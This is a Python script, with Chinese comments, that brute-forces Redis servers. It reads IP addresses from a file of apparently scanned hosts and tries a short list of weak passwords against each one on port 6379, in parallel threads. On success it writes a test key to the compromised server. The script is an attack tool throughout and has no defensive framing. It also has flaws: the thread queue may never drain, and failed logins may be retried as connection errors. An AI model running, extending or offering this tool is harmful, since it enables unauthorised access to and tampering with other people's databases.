import threading
import redis
from queue import Queue
import time

MAX_THREADS = 50
thread_queue = Queue(maxsize=MAX_THREADS)

def check_redis_connection(host, password_list, queue):
    for password in password_list:
        attempt = 0
        max_attempts = 5  # 最大重试次数
        while attempt < max_attempts:
            try:
                # 创建 Redis 连接池
                pool = redis.ConnectionPool(host=host.strip(), port=6379, password=password, db=0, max_connections=10)
                client = redis.Redis(connection_pool=pool)
                # 尝试设置一个键值对
                client.set("test_key", "test_value")
                print(f"成功连接到 {host.strip()} 并设置了键值对")
                return  # 成功后退出循环
            except redis.exceptions.ConnectionError as e:
                print(f"第 {attempt+1} 次连接失败，无法连接到 {host.strip()}：{e}")
                # 使用指数退避策略进行重试
                time.sleep(2**attempt)
                attempt += 1
            except Exception as e:
                print(f"在 {host.strip()} 上操作时遇到错误：{e}")
                return
        if attempt == max_attempts:
            print(f"已达到最大重试次数，无法连接到 {host.strip()}")
    # 完成任务后从队列中移除任务
    queue.get()
    queue.task_done()

def start_thread(ip_list, password_list):
    for ip in ip_list:
        thread_queue.put(ip)
        # 启动一个新线程来检查 Redis 连接
        threading.Thread(target=check_redis_connection, args=(ip, password_list, thread_queue)).start()

if __name__ == '__main__':
    with open("successful_ips.txt", "r") as file:
        ip_list = file.readlines()
        password_list = ['123456', '12345678', 'password']  # 你的密码列表
        # 启动线程来检查 Redis 连接
        start_thread(ip_list, password_list)
    # 等待所有线程完成
    thread_queue.join()
